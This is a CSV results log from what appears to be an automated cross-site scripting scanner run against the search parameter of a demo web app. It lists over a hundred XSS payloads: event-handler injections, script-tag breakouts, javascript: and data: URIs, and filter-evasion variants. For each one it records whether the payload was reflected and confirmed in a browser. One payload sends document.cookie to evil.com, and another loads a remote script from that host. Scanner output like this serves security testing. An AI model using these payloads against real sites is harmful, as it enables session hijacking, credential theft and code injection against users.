Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 17:26:57.126,2026-01-10 17:26:57.888,0.761,https://demo-knsl.onrender.com/search,GET,q,<form><button formaction=javascript:alert(1)>X</button></form>,RAW_REFLECTION,No,,High
2026-01-10 17:26:57.131,2026-01-10 17:26:57.888,0.756,https://demo-knsl.onrender.com/search,GET,q,<form><input type=submit formaction=javascript:alert(1) value=X></form>,RAW_REFLECTION,No,,High
2026-01-10 17:26:57.784,2026-01-10 17:26:57.906,0.122,https://demo-knsl.onrender.com/search,GET,q,<select autofocus onfocus=alert(1)></select>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.823,2026-01-10 17:26:57.944,0.121,https://demo-knsl.onrender.com/search,GET,q,<div onpointerdown=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.870,2026-01-10 17:26:57.986,0.116,https://demo-knsl.onrender.com/search,GET,q,<div onpointerover=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.871,2026-01-10 17:26:57.986,0.115,https://demo-knsl.onrender.com/search,GET,q,<div onpointerleave=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.871,2026-01-10 17:26:57.998,0.127,https://demo-knsl.onrender.com/search,GET,q,<div onpointerenter=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.888,2026-01-10 17:26:57.998,0.111,https://demo-knsl.onrender.com/search,GET,q,<div ontouchend=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.888,2026-01-10 17:26:58.002,0.115,https://demo-knsl.onrender.com/search,GET,q,<div ontouchstart=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.944,2026-01-10 17:26:58.004,0.060,https://demo-knsl.onrender.com/search,GET,q,"<div style=""animation:spin 1s"" onanimationstart=alert(1)>X</div>",NO_REFLECTION,No,,Info
2026-01-10 17:26:57.906,2026-01-10 17:26:58.028,0.123,https://demo-knsl.onrender.com/search,GET,q,<div ontouchmove=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.986,2026-01-10 17:26:58.054,0.068,https://demo-knsl.onrender.com/search,GET,q,"<div style=""animation:spin 1s"" onanimationend=alert(1)>X</div>",NO_REFLECTION,No,,Info
2026-01-10 17:26:57.986,2026-01-10 17:26:58.059,0.073,https://demo-knsl.onrender.com/search,GET,q,"<div style=""animation:spin 1s"" onanimationiteration=alert(1)>X</div>",NO_REFLECTION,No,,Info
2026-01-10 17:26:57.998,2026-01-10 17:26:58.060,0.062,https://demo-knsl.onrender.com/search,GET,q,"<div style=""transition:all 1s"" ontransitionend=alert(1)>X</div>",NO_REFLECTION,No,,Info
2026-01-10 17:26:58.004,2026-01-10 17:26:58.065,0.061,https://demo-knsl.onrender.com/search,GET,q,<div contenteditable oninput=alert(1)>X</div>,NO_REFLECTION,No,,Info
2026-01-10 17:26:58.002,2026-01-10 17:26:58.104,0.102,https://demo-knsl.onrender.com/search,GET,q,<input accesskey=x onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.998,2026-01-10 17:26:58.104,0.106,https://demo-knsl.onrender.com/search,GET,q,<div data-x=x onclick=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.054,2026-01-10 17:26:58.186,0.132,https://demo-knsl.onrender.com/search,GET,q,<select><option oninput=alert(1)>X</option></select>,NO_REFLECTION,No,,Info
2026-01-10 17:26:58.028,2026-01-10 17:26:58.189,0.160,https://demo-knsl.onrender.com/search,GET,q,<input type=hidden onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.059,2026-01-10 17:26:58.197,0.137,https://demo-knsl.onrender.com/search,GET,q,"<img/src=""x""/onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.060,2026-01-10 17:26:58.208,0.148,https://demo-knsl.onrender.com/search,GET,q,<img%20src=x%20onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.065,2026-01-10 17:26:58.208,0.143,https://demo-knsl.onrender.com/search,GET,q,<img	src=x	onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.104,2026-01-10 17:26:58.211,0.106,https://demo-knsl.onrender.com/search,GET,q,<script,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.104,2026-01-10 17:26:58.212,0.108,https://demo-knsl.onrender.com/search,GET,q,<script	>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.495,2026-01-10 17:26:58.235,0.740,https://demo-knsl.onrender.com/search,GET,q,<svg onload=fetch('http://evil.com?c='+document.cookie)>,RAW_REFLECTION,No,,High
2026-01-10 17:26:58.189,2026-01-10 17:26:58.321,0.132,https://demo-knsl.onrender.com/search,GET,q,<script,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.186,2026-01-10 17:26:58.321,0.134,https://demo-knsl.onrender.com/search,GET,q,>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.208,2026-01-10 17:26:58.390,0.182,https://demo-knsl.onrender.com/search,GET,q,<svg/onload=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.208,2026-01-10 17:26:58.390,0.182,https://demo-knsl.onrender.com/search,GET,q,<svg/onload=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.212,2026-01-10 17:26:58.392,0.180,https://demo-knsl.onrender.com/search,GET,q,<marquee onstart=prompt(1)>X</marquee>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.211,2026-01-10 17:26:58.392,0.182,https://demo-knsl.onrender.com/search,GET,q,<svg/onload=print()>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.235,2026-01-10 17:26:58.394,0.160,https://demo-knsl.onrender.com/search,GET,q,<marquee onstart=confirm(1)>X</marquee>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.321,2026-01-10 17:26:58.463,0.142,https://demo-knsl.onrender.com/search,GET,q,<iframe/src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.321,2026-01-10 17:26:58.463,0.143,https://demo-knsl.onrender.com/search,GET,q,<iframe/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.390,2026-01-10 17:26:58.507,0.118,https://demo-knsl.onrender.com/search,GET,q,<iframe%20src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.392,2026-01-10 17:26:58.507,0.115,https://demo-knsl.onrender.com/search,GET,q,<embed/src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.390,2026-01-10 17:26:58.512,0.123,https://demo-knsl.onrender.com/search,GET,q,<object/data=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.392,2026-01-10 17:26:58.513,0.121,https://demo-knsl.onrender.com/search,GET,q,"<object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.394,2026-01-10 17:26:58.517,0.123,https://demo-knsl.onrender.com/search,GET,q,"<embed src=data:text/html,<script>alert(1)</script>>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.843,2026-01-10 17:26:58.585,0.742,https://demo-knsl.onrender.com/search,GET,q,<div onpointerup=alert(1)>X</div>,RAW_REFLECTION,No,,High
2026-01-10 17:26:57.878,2026-01-10 17:26:58.621,0.744,https://demo-knsl.onrender.com/search,GET,q,<div onpointermove=alert(1)>X</div>,RAW_REFLECTION,No,,High
2026-01-10 17:26:58.463,2026-01-10 17:26:58.629,0.166,https://demo-knsl.onrender.com/search,GET,q,<var onmouseover=alert(1)>X</var>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.463,2026-01-10 17:26:58.629,0.166,https://demo-knsl.onrender.com/search,GET,q,<code onmouseover=alert(1)>X</code>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.512,2026-01-10 17:26:58.670,0.158,https://demo-knsl.onrender.com/search,GET,q,<h1 onmouseover=alert(1)>X</h1>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.513,2026-01-10 17:26:58.670,0.156,https://demo-knsl.onrender.com/search,GET,q,<h2 onmouseover=alert(1)>X</h2>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.517,2026-01-10 17:26:58.675,0.157,https://demo-knsl.onrender.com/search,GET,q,<pre onmouseover=alert(1)>X</pre>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.585,2026-01-10 17:26:58.707,0.121,https://demo-knsl.onrender.com/search,GET,q,<blockquote onmouseover=alert(1)>X</blockquote>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.621,2026-01-10 17:26:58.710,0.089,https://demo-knsl.onrender.com/search,GET,q,<ol onmouseover=alert(1)><li>X</li></ol>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.629,2026-01-10 17:26:58.752,0.122,https://demo-knsl.onrender.com/search,GET,q,<ul onmouseover=alert(1)><li>X</li></ul>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.629,2026-01-10 17:26:58.752,0.122,https://demo-knsl.onrender.com/search,GET,q,<li onmouseover=alert(1)>X</li>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.675,2026-01-10 17:26:58.786,0.111,https://demo-knsl.onrender.com/search,GET,q,<dd onmouseover=alert(1)>X</dd>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.670,2026-01-10 17:26:58.786,0.116,https://demo-knsl.onrender.com/search,GET,q,<dl onmouseover=alert(1)><dt>X</dt></dl>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.670,2026-01-10 17:26:58.789,0.119,https://demo-knsl.onrender.com/search,GET,q,<dt onmouseover=alert(1)>X</dt>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.707,2026-01-10 17:26:58.809,0.103,https://demo-knsl.onrender.com/search,GET,q,<fieldset onmouseover=alert(1)>X</fieldset>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.752,2026-01-10 17:26:58.814,0.062,https://demo-knsl.onrender.com/search,GET,q,<table><caption onmouseover=alert(1)>X</caption></table>,NO_REFLECTION,No,,Info
2026-01-10 17:26:58.710,2026-01-10 17:26:58.817,0.107,https://demo-knsl.onrender.com/search,GET,q,<legend onmouseover=alert(1)>X</legend>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.752,2026-01-10 17:26:58.855,0.103,https://demo-knsl.onrender.com/search,GET,q,<label onmouseover=alert(1)>X</label>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.786,2026-01-10 17:26:58.889,0.103,https://demo-knsl.onrender.com/search,GET,q,<table><colgroup onmouseover=alert(1)></colgroup></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.786,2026-01-10 17:26:58.897,0.111,https://demo-knsl.onrender.com/search,GET,q,<table><col onmouseover=alert(1)></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.789,2026-01-10 17:26:58.897,0.108,https://demo-knsl.onrender.com/search,GET,q,<table><thead onmouseover=alert(1)></thead></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.809,2026-01-10 17:26:58.906,0.096,https://demo-knsl.onrender.com/search,GET,q,<table><tbody onmouseover=alert(1)></tbody></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.814,2026-01-10 17:26:58.914,0.100,https://demo-knsl.onrender.com/search,GET,q,<table><tfoot onmouseover=alert(1)></tfoot></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.817,2026-01-10 17:26:58.915,0.099,https://demo-knsl.onrender.com/search,GET,q,<table><tr onmouseover=alert(1)></tr></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.855,2026-01-10 17:26:58.955,0.100,https://demo-knsl.onrender.com/search,GET,q,<table><th onmouseover=alert(1)>X</th></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.889,2026-01-10 17:26:58.986,0.098,https://demo-knsl.onrender.com/search,GET,q,<table><td onmouseover=alert(1)>X</td></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.197,2026-01-10 17:26:58.988,0.792,https://demo-knsl.onrender.com/search,GET,q,src=//evil.com></script>,RAW_REFLECTION,No,,High
2026-01-10 17:26:58.897,2026-01-10 17:26:58.988,0.092,https://demo-knsl.onrender.com/search,GET,q,<meter onmouseover=alert(1)>X</meter>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.897,2026-01-10 17:26:59.016,0.119,https://demo-knsl.onrender.com/search,GET,q,<progress onmouseover=alert(1)>X</progress>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.915,2026-01-10 17:26:59.016,0.101,https://demo-knsl.onrender.com/search,GET,q,<mark onmouseover=alert(1)>X</mark>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.906,2026-01-10 17:26:59.020,0.114,https://demo-knsl.onrender.com/search,GET,q,<output onmouseover=alert(1)>X</output>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.955,2026-01-10 17:26:59.063,0.108,https://demo-knsl.onrender.com/search,GET,q,<ruby onmouseover=alert(1)>X</ruby>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.986,2026-01-10 17:26:59.114,0.127,https://demo-knsl.onrender.com/search,GET,q,<ruby><rt onmouseover=alert(1)>X</rt></ruby>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.988,2026-01-10 17:26:59.114,0.126,https://demo-knsl.onrender.com/search,GET,q,<bdi onmouseover=alert(1)>X</bdi>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.988,2026-01-10 17:26:59.117,0.129,https://demo-knsl.onrender.com/search,GET,q,<ruby><rp onmouseover=alert(1)>X</rp></ruby>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.016,2026-01-10 17:26:59.125,0.109,https://demo-knsl.onrender.com/search,GET,q,<bdo onmouseover=alert(1)>X</bdo>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.020,2026-01-10 17:26:59.134,0.114,https://demo-knsl.onrender.com/search,GET,q,<ins onmouseover=alert(1)>X</ins>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.016,2026-01-10 17:26:59.140,0.124,https://demo-knsl.onrender.com/search,GET,q,<wbr onmouseover=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.063,2026-01-10 17:26:59.166,0.103,https://demo-knsl.onrender.com/search,GET,q,<del onmouseover=alert(1)>X</del>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.114,2026-01-10 17:26:59.193,0.079,https://demo-knsl.onrender.com/search,GET,q,<strong onmouseover=alert(1)>X</strong>,NO_REFLECTION,No,,Info
2026-01-10 17:26:59.114,2026-01-10 17:26:59.221,0.107,https://demo-knsl.onrender.com/search,GET,q,<small onmouseover=alert(1)>X</small>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.117,2026-01-10 17:26:59.221,0.104,https://demo-knsl.onrender.com/search,GET,q,<em onmouseover=alert(1)>X</em>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.125,2026-01-10 17:26:59.226,0.101,https://demo-knsl.onrender.com/search,GET,q,<b onmouseover=alert(1)>X</b>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.134,2026-01-10 17:26:59.247,0.113,https://demo-knsl.onrender.com/search,GET,q,<i onmouseover=alert(1)>X</i>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.140,2026-01-10 17:26:59.251,0.111,https://demo-knsl.onrender.com/search,GET,q,<u onmouseover=alert(1)>X</u>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.166,2026-01-10 17:26:59.266,0.099,https://demo-knsl.onrender.com/search,GET,q,<s onmouseover=alert(1)>X</s>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.507,2026-01-10 17:26:59.271,0.764,https://demo-knsl.onrender.com/search,GET,q,<p onmouseover=alert(1)>X</p>,RAW_REFLECTION,No,,High
2026-01-10 17:26:58.507,2026-01-10 17:26:59.280,0.773,https://demo-knsl.onrender.com/search,GET,q,<span onmouseover=alert(1)>X</span>,RAW_REFLECTION,No,,High
2026-01-10 17:26:59.193,2026-01-10 17:26:59.293,0.100,https://demo-knsl.onrender.com/search,GET,q,<sub onmouseover=alert(1)>X</sub>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.221,2026-01-10 17:26:59.327,0.106,https://demo-knsl.onrender.com/search,GET,q,<abbr onmouseover=alert(1)>X</abbr>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.247,2026-01-10 17:26:59.356,0.109,https://demo-knsl.onrender.com/search,GET,q,<article onmouseover=alert(1)>X</article>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.221,2026-01-10 17:26:59.356,0.135,https://demo-knsl.onrender.com/search,GET,q,<sup onmouseover=alert(1)>X</sup>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.266,2026-01-10 17:26:59.365,0.100,https://demo-knsl.onrender.com/search,GET,q,<footer onmouseover=alert(1)>X</footer>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.280,2026-01-10 17:26:59.382,0.102,https://demo-knsl.onrender.com/search,GET,q,<hgroup onmouseover=alert(1)>X</hgroup>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.327,2026-01-10 17:26:59.388,0.062,https://demo-knsl.onrender.com/search,GET,q,<section onmouseover=alert(1)>X</section>,NO_REFLECTION,No,,Info
2026-01-10 17:26:59.293,2026-01-10 17:26:59.390,0.097,https://demo-knsl.onrender.com/search,GET,q,<nav onmouseover=alert(1)>X</nav>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.271,2026-01-10 17:26:59.396,0.125,https://demo-knsl.onrender.com/search,GET,q,<header onmouseover=alert(1)>X</header>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.365,2026-01-10 17:26:59.428,0.063,https://demo-knsl.onrender.com/search,GET,q,<figcaption onmouseover=alert(1)>X</figcaption>,NO_REFLECTION,No,,Info
2026-01-10 17:26:59.356,2026-01-10 17:26:59.469,0.113,https://demo-knsl.onrender.com/search,GET,q,<main onmouseover=alert(1)>X</main>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.356,2026-01-10 17:26:59.471,0.115,https://demo-knsl.onrender.com/search,GET,q,<figure onmouseover=alert(1)>X</figure>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.396,2026-01-10 17:26:59.495,0.099,https://demo-knsl.onrender.com/search,GET,q,<details><summary onmouseover=alert(1)>X</summary></details>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.388,2026-01-10 17:26:59.495,0.107,https://demo-knsl.onrender.com/search,GET,q,<menu onmouseover=alert(1)>X</menu>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.382,2026-01-10 17:26:59.498,0.117,https://demo-knsl.onrender.com/search,GET,q,<dialog onmouseover=alert(1)>X</dialog>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.390,2026-01-10 17:26:59.498,0.108,https://demo-knsl.onrender.com/search,GET,q,<menuitem onmouseover=alert(1)>X</menuitem>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.428,2026-01-10 17:26:59.535,0.106,https://demo-knsl.onrender.com/search,GET,q,<canvas onmouseover=alert(1)>X</canvas>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.469,2026-01-10 17:26:59.549,0.080,https://demo-knsl.onrender.com/search,GET,q,<button onclick=alert(1)>X</button>,NO_REFLECTION,No,,Info
2026-01-10 17:26:59.471,2026-01-10 17:26:59.549,0.078,https://demo-knsl.onrender.com/search,GET,q,<button ondblclick=alert(1)>X</button>,NO_REFLECTION,No,,Info
2026-01-10 17:26:59.495,2026-01-10 17:26:59.575,0.080,https://demo-knsl.onrender.com/search,GET,q,<button onmousedown=alert(1)>X</button>,NO_REFLECTION,No,,Info
2026-01-10 17:26:59.495,2026-01-10 17:26:59.575,0.080,https://demo-knsl.onrender.com/search,GET,q,<button onmouseup=alert(1)>X</button>,NO_REFLECTION,No,,Info
2026-01-10 17:26:59.498,2026-01-10 17:26:59.606,0.108,https://demo-knsl.onrender.com/search,GET,q,'><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.498,2026-01-10 17:26:59.630,0.131,https://demo-knsl.onrender.com/search,GET,q,"""><script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.535,2026-01-10 17:26:59.630,0.095,https://demo-knsl.onrender.com/search,GET,q,"""></script><script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:58.914,2026-01-10 17:26:59.650,0.737,https://demo-knsl.onrender.com/search,GET,q,<time onmouseover=alert(1)>X</time>,RAW_REFLECTION,No,,High
2026-01-10 17:26:59.549,2026-01-10 17:26:59.663,0.114,https://demo-knsl.onrender.com/search,GET,q,';alert(1);//,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.549,2026-01-10 17:26:59.664,0.114,https://demo-knsl.onrender.com/search,GET,q,""";alert(1);//",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.575,2026-01-10 17:26:59.701,0.126,https://demo-knsl.onrender.com/search,GET,q,""" onmouseover=alert(1) x=""",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.606,2026-01-10 17:26:59.732,0.126,https://demo-knsl.onrender.com/search,GET,q,' onmouseover=alert(1) x=',RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.630,2026-01-10 17:26:59.737,0.108,https://demo-knsl.onrender.com/search,GET,q,' autofocus onfocus=alert(1) x=',RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.630,2026-01-10 17:26:59.739,0.109,https://demo-knsl.onrender.com/search,GET,q,""" autofocus onfocus=alert(1) x=""",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.650,2026-01-10 17:26:59.756,0.106,https://demo-knsl.onrender.com/search,GET,q,</script><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.663,2026-01-10 17:26:59.787,0.124,https://demo-knsl.onrender.com/search,GET,q,</script><img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.664,2026-01-10 17:26:59.787,0.124,https://demo-knsl.onrender.com/search,GET,q,</script><svg onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.701,2026-01-10 17:26:59.815,0.114,https://demo-knsl.onrender.com/search,GET,q,--><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.737,2026-01-10 17:26:59.862,0.125,https://demo-knsl.onrender.com/search,GET,q,<q/oncut=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.732,2026-01-10 17:26:59.872,0.140,https://demo-knsl.onrender.com/search,GET,q,--!><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.739,2026-01-10 17:26:59.873,0.134,https://demo-knsl.onrender.com/search,GET,q,<q/onclick=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.756,2026-01-10 17:26:59.875,0.119,https://demo-knsl.onrender.com/search,GET,q,<q/ondrag=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.226,2026-01-10 17:26:59.970,0.744,https://demo-knsl.onrender.com/search,GET,q,<address onmouseover=alert(1)>X</address>,RAW_REFLECTION,No,,High
2026-01-10 17:26:59.251,2026-01-10 17:26:59.988,0.737,https://demo-knsl.onrender.com/search,GET,q,<aside onmouseover=alert(1)>X</aside>,RAW_REFLECTION,No,,High
2026-01-10 17:26:59.787,2026-01-10 17:27:00.026,0.238,https://demo-knsl.onrender.com/search,GET,q,<q/onerror=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.872,2026-01-10 17:27:00.026,0.155,https://demo-knsl.onrender.com/search,GET,q,"'"">><marquee onstart=confirm(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.873,2026-01-10 17:27:00.033,0.161,https://demo-knsl.onrender.com/search,GET,q,"'"">><marquee onstart=prompt(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.875,2026-01-10 17:27:00.045,0.169,https://demo-knsl.onrender.com/search,GET,q,"'"">><div onmouseover=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.787,2026-01-10 17:27:00.045,0.258,https://demo-knsl.onrender.com/search,GET,q,<a href=#x onclick=alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.988,2026-01-10 17:27:00.270,0.282,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert(1) onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-10 17:26:59.970,2026-01-10 17:27:00.272,0.302,https://demo-knsl.onrender.com/search,GET,q,<img src=x oneonerrorrror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:27:00.026,2026-01-10 17:27:00.274,0.248,https://demo-knsl.onrender.com/search,GET,q,<button formaction=javascript:alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:27:00.026,2026-01-10 17:27:00.275,0.249,https://demo-knsl.onrender.com/search,GET,q,<input type=submit formaction=javascript:alert(1) value=X>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:27:00.033,2026-01-10 17:27:00.279,0.245,https://demo-knsl.onrender.com/search,GET,q,<form action=javascript:alert(1)><button>X</button></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:27:00.045,2026-01-10 17:27:00.279,0.235,https://demo-knsl.onrender.com/search,GET,q,<video poster=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:27:00.045,2026-01-10 17:27:00.283,0.238,https://demo-knsl.onrender.com/search,GET,q,<html manifest=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:59.575,2026-01-10 17:27:00.332,0.757,https://demo-knsl.onrender.com/search,GET,q,"""onmouseover=""alert(1)",RAW_REFLECTION,No,,High
2026-01-10 17:27:00.279,2026-01-10 17:27:00.407,0.129,https://demo-knsl.onrender.com/search,GET,q,<a href=about:blank>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:27:00.275,2026-01-10 17:27:00.410,0.134,https://demo-knsl.onrender.com/search,GET,q,<a href=vbscript:msgbox(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
